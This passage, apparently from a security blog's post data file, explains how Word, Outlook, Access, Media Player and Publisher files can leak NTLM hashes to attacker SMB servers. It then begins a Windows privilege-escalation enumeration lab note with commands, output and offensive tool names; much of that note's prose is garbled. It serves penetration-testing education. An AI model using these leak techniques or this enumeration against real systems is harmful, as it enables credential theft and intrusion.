<img src="assets/posts/ntlm-credential-leakage/Pasted image 20260411063448.png" alt="Pasted image 20260411063448" />
<p>然而，大多数用户可能会启用编辑功能，尤其是在文档看起来合法且无法通过其他方式修改的情况下。点击“Enable Editing”后，会弹出一个警告窗口，提示文档可能包含<strong>恶意链接</strong>，您可以选择拒绝这些更新。</p>
<img src="assets/posts/ntlm-credential-leakage/Pasted image 20260411063513.png" alt="Pasted image 20260411063513" />
<p>您是否认为拒绝此提示中的链接会阻止所有外部连接？如果是这样，那就错了。由于<strong>Microsoft Word 处理自动 OLE（对象链接和嵌入）链接的方式存在逻辑缺陷</strong>，它会绕过“ _QueryHotLinks_ ”函数，忽略用户的响应。这会导致即使用户拒绝，也会通过调用链接上的std::filesystem::exists函数<strong>来自动访问远程文件。</strong></p>
<p>如前所述，此次访问尝试会导致系统回退到通过 SMB 进行的 NTLM 身份验证。反过来，您的 NT 哈希值（NTLM 哈希值）将被发送到远程服务器，从而导致<strong>NTLM 凭据泄露</strong>。</p>
<p><strong>该攻击通过在RTF文件中嵌入LINK属性</strong>自动发起，利用特定的“a”和“p”属性来控制OLE链接对象。除了启用编辑功能外，无需用户进行任何其他交互，这使得该漏洞尤其危险。</p>
<h2>2. Microsoft Outlook：通过远程图片标签泄露 NTLM 身份验证</h2>
<p><strong>想象一下，你收到一封来自不可信发件人的</strong>电子邮件，邮件正文的 HTML 代码中包含一张图片。攻击者使用了一种简单的技巧，通过类似这样的 HTML 标签插入图片：</p>
<img src="assets/posts/ntlm-credential-leakage/Pasted image 20260411063704.png" alt="Pasted image 20260411063704" />
<img src="assets/posts/ntlm-credential-leakage/Pasted image 20260411063712.png" alt="Pasted image 20260411063712" />
<p>乍一看，这似乎并非一次复杂的攻击，大多数用户可能会忽略这张图片或避免保存它。然而，如果您尝试<strong>保存这张图片</strong>，您的 NTLM 凭据将立即泄露，因为该图片托管在远程恶意服务器上。Outlook 的安全机制旨在阻止对不受信任的电子邮件自动渲染图片，从而在这种情况下提供一定的保护。</p>
<p>*<strong>真正的危险：可信发件人</strong>*</p>
<p>当邮件来自<strong>可信发件人</strong>（例如同事或已被盗用的公司联系人）时，情况会变得更加危险。在这种情况下，图片会在打开邮件时自动渲染，无需任何用户交互。Outlook 尝试获取图片时，会向攻击者的 SMB 服务器发送<strong>NTLM 身份验证请求，从而泄露您的 NTLM 哈希值（NT 哈希）。</strong></p>
<img src="assets/posts/ntlm-credential-leakage/Pasted image 20260411063755.png" alt="Pasted image 20260411063755" />
<p><strong>为什么会发生这种情况</strong></p>
<p>此漏洞的出现是因为 Outlook 会根据<strong>发件人的信任级别</strong>应用不同的安全规则。当电子邮件来自受信任的来源时，Outlook 不会阻止图像的自动渲染。带有指向远程 SMB 服务器的 src 属性的 HTML &lt;img&gt; 标签会在邮件打开时立即触发 NTLM 身份验证请求。这会导致用户的 NTLM 凭据立即泄露，而无需用户进行任何显式操作。</p>
<p>在某些情况下，该问题甚至被发现可通过恶意图像复合匿名渲染实现<strong>远程代码执行 (</strong> <a href="https://www.youtube.com/watch?v=EQh6apPSRP0" target="_blank" rel="noreferrer"><strong>RCE</strong></a> <strong>)</strong>，尽管该特定漏洞已被修复。然而，自动 NTLM 泄露这一根本问题依然存在，尤其是在处理被入侵的受信任帐户时。</p>
<h2>3. Microsoft Access：通过远程表刷新泄露 NTLM 身份验证</h2>
<p><strong>想象一下，你收到一份名为report.accdb</strong>的 Microsoft Access 数据库文件形式的报告。你自然会打开该文件查看其内容。然而，首先映入眼帘的是一条警告信息：<strong>“此文件中的活动内容已被阻止”</strong> 许多用户可能会忽略这条信息，认为这是一种保护措施，并会因为潜在的危险内容已被禁用而感到安心。</p>
<img src="assets/posts/ntlm-credential-leakage/Pasted image 20260411064108.png" alt="Pasted image 20260411064108" />
<p>忽略警告后，您将可以访问报告，报告中会显示一个醒目的黄色横幅，提示<strong>活动内容已被禁用</strong>。此横幅旨在让您产生一种安全感，暗示只要您不点击<strong>启用内容</strong> ，就可以安全地与文件交互。 然而，这是一种虚假的安全感——在您看到此横幅之前，您的 NTLM 哈希值就已经泄露了。</p>
<img src="assets/posts/ntlm-credential-leakage/Pasted image 20260411064154.png" alt="Pasted image 20260411064154" />
<p><strong>为什么会发生这种情况</strong></p>
<p>此问题源于对 Microsoft Access 内置功能的利用。攻击者使用<strong>查询对象</strong>结合<strong>AutoExec 宏</strong>进行攻击。AutoExec 宏配置为在打开 Access 文件时<strong>自动对远程表执行查询</strong>。这意味着，无论是否启用了活动内容，应用程序都会在文件打开后立即尝试连接到远程表。</p>
<p>如果远程表托管在恶意 SMB 服务器上，Microsoft Access 将自动尝试使用 NTLM 进行身份验证，从而导致<strong>NTLM 凭据泄露</strong>。这种情况发生在用户决定是否启用活动内容之前，因此初始警告消息无效。</p>
<h2>4. Microsoft Media Player：通过旧版播放列表文件泄露 NTLM 身份验证信息</h2>
<p>想象一下，你收到一封电子邮件，附件中有一个名为<strong>voicemail.wax的</strong>音频快捷方式文件。出于好奇，你想听听里面的内容，于是双击了该文件。仅仅这一次双击，就可能在不知不觉中泄露你的 NTLM 凭据。</p>
<img src="assets/posts/ntlm-credential-leakage/Pasted image 20260411064236.png" alt="Pasted image 20260411064236" />
<p>通过电子邮件附件接收语音邮件或视频消息很常见，而且这种做法可能已经在实际环境中被用于窃取 NTLM 信息。</p>
<p><strong>为什么会发生这种情况</strong></p>
<p><strong>此漏洞利用了Microsoft Windows Media Player</strong>处理某些媒体播放列表文件的方式上的缺陷。攻击者可以构造一封带有附件的恶意电子邮件，该附件使用<strong>.wax、.wvx 或 .wmx</strong> 文件扩展名。当收件人双击该附件时，它会使用默认的媒体播放器应用程序（通常是<strong>wmplayer.exe</strong>）打开。然后，播放列表文件会指示 Windows Media Player 从攻击者控制的 SMB 服务器检索并播放媒体流。</p>
<p>在此过程中，媒体播放器会无意中将用户的<strong>NT 哈希值</strong>作为身份验证请求的一部分发送到远程服务器，从而导致<strong>NTLM 凭据自动泄露</strong>。此过程完全透明，无需用户进行任何进一步操作。</p>
<p><strong>“设计缺陷”漏洞</strong></p>
<p>不出所料，微软将此问题归类为一项功能。其逻辑在于，用户理应谨慎处理媒体文件。然而，更令人惊讶的是<strong>Outlook 安全筛选器</strong>对这些文件的处理方式存在不一致。Outlook 会将<strong>.asx</strong>播放列表文件作为潜在危险附件进行屏蔽，但却不会<strong>屏蔽 .wax、.wvx 或 .wmx</strong>文件——尽管所有这些文件都可能触发相同的行为并泄露 NTLM 凭据。</p>
<img src="assets/posts/ntlm-credential-leakage/Pasted image 20260411064309.png" alt="Pasted image 20260411064309" />
<h2>5. Microsoft Publisher：通过远程收件人列表泄露 NTLM 身份验证</h2>
<p>想象一下，你收到一份设计精美的公司节日派对邀请函，它巧妙地伪装成一个名为<strong>Christmas_Party.pub的Publisher 文件</strong>。你好奇地双击该文件查看邀请函。然而，随即出现一个警告提示：<strong>“是否要打开此出版物并访问外部数据？”</strong></p>
<p>你和你的同事都接受过处理可疑文件的培训，所以你自信地点击了 <strong>“否”</strong> 以为已经避免了任何风险。<strong>不幸的是，你错了——在警告出现之前，你的NTLM凭据就已经泄露了。</strong></p>
<p><strong>!微软发布者警告：外部数据 NTLM 泄露</strong></p>
<p><strong>为什么会发生这种情况</strong></p>
<p><strong>此漏洞利用了Microsoft Publisher</strong>中专为<strong>邮件合并功能</strong>设计的一项特性。Publisher 可以从远程数据源（例如 SMB 服务器上的外部文件）加载联系人列表。问题在于：即使在提示用户允许或拒绝访问之前，打开文档时<strong>也会自动验证远程文件是否存在</strong>。此文件检查使用 NTLM 身份验证，导致您的 NTLM 哈希值（NT 哈希）在未经您同意的情况下被发送到远程服务器。</p>
<p>换句话说，虽然实际获取联系人列表内容需要用户授权，但初始的文件存在性检查会触发<strong>NTLM 身份验证请求</strong>，从而导致<strong>您的 NTLM 凭据泄露</strong>。攻击者甚至不需要远程联系人列表实际存在——仅仅是尝试验证它就足以窃取您的凭据。</p>`
    }
  },
{
    id: "windows-privilege-escalation",
    href: "posts/pentest/windows-privilege-escalation.html",
    title: {
      "en": "Windows Privilege Escalation: Complete Enumeration Methodology",
      "zh": "Windows 权限提升：完整枚举方法论"
    },
    category: "pentest",
    categoryLabel: {
      "en": "Penetration Testing",
      "zh": "渗透测试"
    },
    description: {
      "en": "A complete Windows privilege escalation methodology covering goals, tools, situational awareness, system enumeration, users, groups, processes, and services.",
      "zh": "按照原笔记结构整理 Windows 本地提权目标、场景、工具、态势感知、系统、用户、服务与权限枚举。"
    },
    date: "2026-05-07",
    content: {
      "en": "A complete Windows privilege escalation methodology covering goals, tools, situational awareness, system enumeration, users, groups, processes, and services.",
      "zh": "按照原笔记结构整理 Windows 本地提权目标、场景、工具、态势感知、系统、用户、服务与权限枚举。"
    },
    code: "whoami /priv && systeminfo && net localgroup administrators",
    contentHtml: {
      en: String.raw`<h2>Introduction</h2>
<ol><li><a href="https://www.techopedia.com/definition/29456/golden-image" target="_blank" rel="noreferrer"></a>Windows</li><li>NT AUTHORITY\System Active Directory</li></ol>
<ul><li>Windows</li><li>Windows</li><li>/</li></ul>
<p>Snaffler <code>.sql</code> MSSQL xp_cmdshell ​​ SeImpersonatePrivilege Juicy Potato / Shell</p>
<p><strong> FreeRDP </strong></p>
<pre><code class="language-shell-session">Chenduoduo@htb[/htb]$  xfreerdp /v:10.129.43.36 /u:htb-student

[21:17:27:323] [28158:28159] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[21:17:27:323] [28158:28159] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[21:17:27:324] [28158:28159] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[21:17:27:324] [28158:28159] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
[21:17:27:648] [28158:28159] [INFO][com.freerdp.primitives] - primitives autodetect, using optimized
[21:17:27:672] [28158:28159] [INFO][com.freerdp.core] - freerdp_tcp_is_hostname_resolvable:freerdp_set_last_error_ex resetting error state
[21:17:27:672] [28158:28159] [INFO][com.freerdp.core] - freerdp_tcp_connect:freerdp_set_last_error_ex resetting error state
[21:17:28:770] [28158:28159] [INFO][com.freerdp.crypto] - creating directory /home/user2/.config/freerdp
[21:17:28:770] [28158:28159] [INFO][com.freerdp.crypto] - creating directory [/home/user2/.config/freerdp/certs]
[21:17:28:771] [28158:28159] [INFO][com.freerdp.crypto] - created directory [/home/user2/.config/freerdp/server]
[21:17:28:794] [28158:28159] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[21:17:28:794] [28158:28159] [WARN][com.freerdp.crypto] - CN = WINLPE-SKILLS1-SRV
[21:17:28:795] [28158:28159] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[21:17:28:795] [28158:28159] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[21:17:28:795] [28158:28159] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[21:17:28:795] [28158:28159] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.43.36:3389) 
[21:17:28:795] [28158:28159] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[21:17:28:795] [28158:28159] [ERROR][com.freerdp.crypto] - Common Name (CN):
[21:17:28:795] [28158:28159] [ERROR][com.freerdp.crypto] - 	WINLPE-SKILLS1-SRV
[21:17:28:795] [28158:28159] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.43.36:3389 (RDP-Server):
	Common Name: WINLPE-SKILLS1-SRV
	Subject:     CN = WINLPE-SKILLS1-SRV
	Issuer:      CN = WINLPE-SKILLS1-SRV
	Thumbprint:  9f:f0:dd:28:f5:6f:83:db:5e:8c:5a:e9:5f:50:a4:50:2d:b3:e7:a7:af:f4:4a:8a:1a:08:f3:cb:46:c3:c3:e8
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) y
Password: </code></pre>
<p><strong>Useful Tools</strong></p>
<div class="post-table-wrap"><table><thead><tr><th>Tool</th><th>Description</th></tr></thead><tbody><tr><td>Seatbelt</td><td>C#</td></tr><tr><td>winPEAS</td><td>WinPEAS Windows <a href="https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html" target="_blank" rel="noreferrer"></a></td></tr><tr><td>PowerUp</td><td>Windows PowerShell</td></tr><tr><td>SharpUp</td><td>C# PowerUp</td></tr><tr><td>JAWS</td><td>PowerShell 2.0 PowerShell</td></tr><tr><td>SessionGopher</td><td>SessionGopher PowerShell PuTTY WinSCP SuperPuTTY FileZilla RDP</td></tr><tr><td>Watson</td><td>Watson .NET KB</td></tr><tr><td>LaZagne</td><td>Web Git PHP Windows</td></tr><tr><td>Windows Exploit Suggester - Next Generation</td><td>WES-NG Windows <code>systeminfo</code> Windows XP Windows 10 Windows Windows Server</td></tr><tr><td>Sysinternals Suite</td><td>Sysinternals AccessChk PipeList PsService</td></tr></tbody></table></div>
<h2>Getting the Lay of the Land</h2>
<h3>Situational Awareness</h3>
<ol><li><strong> </strong></li></ol>
<pre><code class="language-cmd-session">C:\htb&gt; ipconfig /all</code></pre>
<p><strong>ARP </strong></p>
<pre><code class="language-cmd-session">C:\htb&gt; arp -a</code></pre>
<pre><code class="language-cmd-session">C:\htb&gt; route print</code></pre>
<ol><li><strong> </strong></li></ol>
<p><code>cmd.exe</code> <code>powershell.exe</code> Microsoft AppLocker GetAppLockerPolicy cmdlet AppLocker AppLocker</p>
<ul><li>Windows Defender</li></ul>
<pre><code class="language-powershell-session">PS C:\htb&gt; Get-MpComputerStatus

AMEngineVersion                 : 1.1.17900.7
AMProductVersion                : 4.10.14393.2248
AMServiceEnabled                : True
AMServiceVersion                : 4.10.14393.2248
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 3/28/2021 2:59:13 AM
AntispywareSignatureVersion     : 1.333.1470.0
AntivirusEnabled                : True
AntivirusSignatureAge           : 1
AntivirusSignatureLastUpdated   : 3/28/2021 2:59:12 AM
AntivirusSignatureVersion       : 1.333.1470.0
BehaviorMonitorEnabled          : False
ComputerID                      : 54AF7DE4-3C7E-4DA0-87AC-831B045B9063
ComputerState                   : 0
FullScanAge                     : 4294967295
FullScanEndTime                 :
FullScanStartTime               :
IoavProtectionEnabled           : False
LastFullScanSource              : 0
LastQuickScanSource             : 0
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
NISSignatureAge                 : 4294967295
NISSignatureLastUpdated         :
NISSignatureVersion             : 0.0.0.0
OnAccessProtectionEnabled       : False
QuickScanAge                    : 4294967295
QuickScanEndTime                :
QuickScanStartTime              :
RealTimeProtectionEnabled       : False
RealTimeScanDirection           : 0
PSComputerName                  :</code></pre>
<ul><li>AppLocker</li></ul>
<pre><code class="language-powershell-session">PS C:\htb&gt; Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

PublisherConditions : {*\*\*,0.0.0.0-*}
PublisherExceptions : {}
PathExceptions      : {}
HashExceptions      : {}
Id                  : a9e18c21-ff8f-43cf-b9fc-db40eed693ba
Name                : (Default Rule) All signed packaged apps
Description         : Allows members of the Everyone group to run packaged apps that are signed.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%PROGRAMFILES%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 921cc481-6e17-4653-8f75-050b80acca20
Name                : (Default Rule) All files located in the Program Files folder
Description         : Allows members of the Everyone group to run applications that are located in the Program Files
                      folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%WINDIR%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : a61c8b2c-a319-4cd0-9690-d2177cad7b51
Name                : (Default Rule) All files located in the Windows folder
Description         : Allows members of the Everyone group to run applications that are located in the Windows folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : fd686d83-a829-4351-8ff4-27c7de5755d2
Name                : (Default Rule) All files
Description         : Allows members of the local Administrators group to run all applications.
UserOrGroupSid      : S-1-5-32-544
Action              : Allow

PublisherConditions : {*\*\*,0.0.0.0-*}
PublisherExceptions : {}
PathExceptions      : {}
HashExceptions      : {}
Id                  : b7af7102-efde-4369-8a89-7a6a392d1473
Name                : (Default Rule) All digitally signed Windows Installer files
Description         : Allows members of the Everyone group to run digitally signed Windows Installer files.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%WINDIR%\Installer\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 5b290184-345a-4453-b184-45305f6d9a54
Name                : (Default Rule) All Windows Installer files in %systemdrive%\Windows\Installer
Description         : Allows members of the Everyone group to run all Windows Installer files located in
                      %systemdrive%\Windows\Installer.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {*.*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 64ad46ff-0d71-4fa0-a30b-3f3d30c5433d
Name                : (Default Rule) All Windows Installer files
Description         : Allows members of the local Administrators group to run all Windows Installer files.
UserOrGroupSid      : S-1-5-32-544
Action              : Allow

PathConditions      : {%PROGRAMFILES%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 06dce67b-934c-454f-a263-2515c8796a5d
Name                : (Default Rule) All scripts located in the Program Files folder
Description         : Allows members of the Everyone group to run scripts that are located in the Program Files folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%WINDIR%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 9428c672-5fc3-47f4-808a-a0011f36dd2c
Name                : (Default Rule) All scripts located in the Windows folder
Description         : Allows members of the Everyone group to run scripts that are located in the Windows folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : ed97d0cb-15ff-430f-b82c-8d7832957725
Name                : (Default Rule) All scripts
Description         : Allows members of the local Administrators group to run all scripts.
UserOrGroupSid      : S-1-5-32-544
Action              : Allow</code></pre>
<ul><li>AppLocker</li></ul>
<pre><code class="language-powershell-session">PS C:\htb&gt; Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone

FilePath                    PolicyDecision MatchingRule
--------                    -------------- ------------
C:\Windows\System32\cmd.exe         Denied c:\windows\system32\cmd.exe


PS C:\htb&gt; Get-AppLockerPolicy -Local | Test-AppLockerPolicy -Path C:\*\*\*\*.exe -User Everyone
PS C:\htb&gt; Get-AppLockerPolicy -Local | Test-AppLockerPolicy -Path C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe -User Everyone</code></pre>
<h3>Initial Enumeration</h3>
<ul><li>The highly privileged <code>NT AUTHORITY\SYSTEM</code> account, or LocalSystem account which is a highly privileged account with more privileges than a local administrator account and is used to run most Windows services.</li><li>The built-in local <code>administrator</code> account. Some organizations disable this account, but many do not. It is not uncommon to see this account reused across multiple systems in a client environment.</li><li>Another local account that is a member of the local <code>Administrators</code> group. Any account in this group will have the same privileges as the built-in <code>administrator</code> account.</li><li>A standard (non-privileged) domain user who is part of the local <code>Administrators</code> group.</li><li>A domain admin (highly privileged in the Active Directory environment) that is part of the local <code>Administrators</code> group.</li></ul>
<ul><li><code>OS name</code> <code> </code> Windows Windows 7 10 Server 2008 2012 2016 2019 <code>PowerShell</code></li><li><code>Version</code>: <a href="https://en.wikipedia.org/wiki/Comparison_of_Microsoft_Windows_versions" target="_blank" rel="noreferrer"></a> Windows Windows</li><li><code>Running Services</code> <code> </code> <code>NT AUTHORITY\SYSTEM</code></li></ul>
<h4>System Information</h4>
<pre><code class="language-cmd">Tasklist</code></pre>
<pre><code class="language-cmd-session">C:\htb&gt; tasklist /svc

Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A
smss.exe                       316 N/A
csrss.exe                      424 N/A
wininit.exe                    528 N/A
csrss.exe                      540 N/A
winlogon.exe                   612 N/A
services.exe                   664 N/A
lsass.exe                      672 KeyIso, SamSs, VaultSvc
svchost.exe                    776 BrokerInfrastructure, DcomLaunch, LSM,
                                   PlugPlay, Power, SystemEventsBroker
svchost.exe                    836 RpcEptMapper, RpcSs
LogonUI.exe                    952 N/A
dwm.exe                        964 N/A
svchost.exe                    972 TermService
svchost.exe                   1008 Dhcp, EventLog, lmhosts, TimeBrokerSvc
svchost.exe                    364 NcbService, PcaSvc, ScDeviceEnum, TrkWks,
                                   UALSVC, UmRdpService
&lt;...SNIP...&gt;

svchost.exe                   1468 Wcmsvc
svchost.exe                   1804 PolicyAgent
spoolsv.exe                   1884 Spooler
svchost.exe                   1988 W3SVC, WAS
svchost.exe                   1996 ftpsvc
svchost.exe                   2004 AppHostSvc
FileZilla Server.exe          1140 FileZilla Server
inetinfo.exe                  1164 IISADMIN
svchost.exe                   1736 DiagTrack
svchost.exe                   2084 StateRepository, tiledatamodelsvc
VGAuthService.exe             2100 VGAuthService
vmtoolsd.exe                  2112 VMTools
MsMpEng.exe                   2136 WinDefend

&lt;...SNIP...&gt;

FileZilla Server Interfac     5628 N/A
jusched.exe                   5796 N/A
cmd.exe                       4132 N/A
conhost.exe                   4136 N/A
TrustedInstaller.exe          1120 TrustedInstaller
TiWorker.exe                  1816 N/A
WmiApSrv.exe                  2428 wmiApSrv
tasklist.exe                  3596 N/A</code></pre>
<p>Windows smss.exe csrss.exe WinLogon winlogon.exe LSASS svchost.exe / / <code>FileZilla</code> FTP FTP</p>
<p>PATH <code>set</code> HOME DRIVE “IT ” / / <a href="https://docs.microsoft.com/en-us/windows-server/storage/folder-redirection/folder-redirection-rup-overview" target="_blank" rel="noreferrer"></a> <code>USERPROFILE\AppData\Microsoft\Windows\Start Menu\Programs\Startup</code></p>
<pre><code class="language-cmd-session">C:\htb&gt; set

ALLUSERSPROFILE=C:\ProgramData
APPDATA=C:\Users\Administrator\AppData\Roaming
CommonProgramFiles=C:\Program Files\Common Files
CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
CommonProgramW6432=C:\Program Files\Common Files
COMPUTERNAME=WINLPE-SRV01
ComSpec=C:\Windows\system32\cmd.exe
HOMEDRIVE=C:
HOMEPATH=\Users\Administrator
LOCALAPPDATA=C:\Users\Administrator\AppData\Local
LOGONSERVER=\\WINLPE-SRV01
NUMBER_OF_PROCESSORS=6
OS=Windows_NT
Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps;
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
PROCESSOR_ARCHITECTURE=AMD64
PROCESSOR_IDENTIFIER=AMD64 Family 23 Model 49 Stepping 0, AuthenticAMD
PROCESSOR_LEVEL=23
PROCESSOR_REVISION=3100
ProgramData=C:\ProgramData
ProgramFiles=C:\Program Files
ProgramFiles(x86)=C:\Program Files (x86)
ProgramW6432=C:\Program Files
PROMPT=$P$G
PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
PUBLIC=C:\Users\Public
SESSIONNAME=Console
SystemDrive=C:
SystemRoot=C:\Windows
TEMP=C:\Users\ADMINI~1\AppData\Local\Temp\1
TMP=C:\Users\ADMINI~1\AppData\Local\Temp\1
USERDOMAIN=WINLPE-SRV01
USERDOMAIN_ROAMINGPROFILE=WINLPE-SRV01
USERNAME=Administrator
USERPROFILE=C:\Users\Administrator
windir=C:\Windows </code></pre>
<pre><code class="language-cmd-session">C:\htb&gt; systeminfo

Host Name:                 WINLPE-SRV01
OS Name:                   Microsoft Windows Server 2016 Standard
OS Version:                10.0.14393 N/A Build 14393
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00376-30000-00299-AA303
Original Install Date:     3/24/2021, 3:46:32 PM
System Boot Time:          3/25/2021, 9:24:36 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              3 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [03]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.16707776.B64.2008070230, 8/7/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US &amp; Canada)
Total Physical Memory:     6,143 MB
Available Physical Memory: 3,474 MB
Virtual Memory: Max Size:  10,371 MB
Virtual Memory: Available: 7,544 MB
Virtual Memory: In Use:    2,827 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\WINLPE-SRV01
Hotfix(s):                 3 Hotfix(s) Installed.
                           [01]: KB3199986
                           [02]: KB5001078
                           [03]: KB4103723
Network Card(s):           2 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.43.8
                                 [02]: fe80::e4db:5ea3:2775:8d4d
                                 [03]: dead:beef::e4db:5ea3:2775:8d4d
                           [02]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet1
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 192.168.20.56
                                 [02]: fe80::f055:fefd:b1b:9919
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.</code></pre>
<pre><code class="language-cmd">systeminfo WMI-Command QFE</code></pre>
<pre><code class="language-cmd-session">C:\htb&gt; wmic qfe

Caption                                     CSName        Description      FixComments  HotFixID   InstallDate  InstalledBy          InstalledOn  Name  ServicePackInEffect  Status
http://support.microsoft.com/?kbid=3199986  WINLPE-SRV01  Update                        KB3199986               NT AUTHORITY\SYSTEM  11/21/2016
https://support.microsoft.com/help/5001078  WINLPE-SRV01  Security Update               KB5001078               NT AUTHORITY\SYSTEM  3/25/2021
http://support.microsoft.com/?kbid=4103723  WINLPE-SRV01  Security Update               KB4103723               NT AUTHORITY\SYSTEM  3/25/2021</code></pre>
<pre><code class="language-powershell">PowerShell cmdlet</code></pre>
<pre><code class="language-powershell-session">PS C:\htb&gt; Get-HotFix | ft -AutoSize

Source       Description     HotFixID  InstalledBy                InstalledOn
------       -----------     --------  -----------                -----------
WINLPE-SRV01 Update          KB3199986 NT AUTHORITY\SYSTEM        11/21/2016 12:00:00 AM
WINLPE-SRV01 Update          KB4054590 WINLPE-SRV01\Administrator 3/30/2021 12:00:00 AM
WINLPE-SRV01 Security Update KB5001078 NT AUTHORITY\SYSTEM        3/25/2021 12:00:00 AM
WINLPE-SRV01 Security Update KB3200970 WINLPE-SRV01\Administrator 4/13/2021 12:00:00 AM</code></pre>
<pre><code class="language-cmd-session">C:\htb&gt; wmic product get name

Name
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.24.28127
Java 8 Update 231 (64-bit)
Microsoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127
VMware Tools
Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.24.28127
Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127
Java Auto Updater

&lt;SNIP&gt;</code></pre>
<pre><code class="language-powershell">PowerShell cmdlet</code></pre>
<pre><code class="language-powershell-session">PS C:\htb&gt; Get-WmiObject -Class Win32_Product |  select Name, Version

Name                                                                    Version
----                                                                    -------
SQL Server 2016 Database Engine Shared                                  13.2.5026.0
Microsoft OLE DB Driver for SQL Server                                  18.3.0.0
Microsoft Visual C++ 2010  x64 Redistributable - 10.0.40219             10.0.40219
Microsoft Help Viewer 2.3                                               2.3.28107
Microsoft Visual C++ 2010  x86 Redistributable - 10.0.40219             10.0.40219
Microsoft Visual C++ 2013 x86 Minimum Runtime - 12.0.21005              12.0.21005
Microsoft Visual C++ 2013 x86 Additional Runtime - 12.0.21005           12.0.21005
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29914          14.28.29914
Microsoft ODBC Driver 13 for SQL Server                                 13.2.5026.0
SQL Server 2016 Database Engine Shared                                  13.2.5026.0
SQL Server 2016 Database Engine Services                                13.2.5026.0
SQL Server Management Studio for Reporting Services                     15.0.18369.0
Microsoft SQL Server 2008 Setup Support Files                           10.3.5500.0
SSMS Post Install Tasks                                                 15.0.18369.0
Microsoft VSS Writer for SQL Server 2016                                13.2.5026.0
Java 8 Update 231 (64-bit)                                              8.0.2310.11
Browser for SQL Server 2016                                             13.2.5026.0
Integration Services                                                    15.0.2000.130

&lt;SNIP&gt;</code></pre>
<p>netstat TCP UDP</p>
<pre><code class="language-cmd-session">PS C:\htb&gt; netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       1096
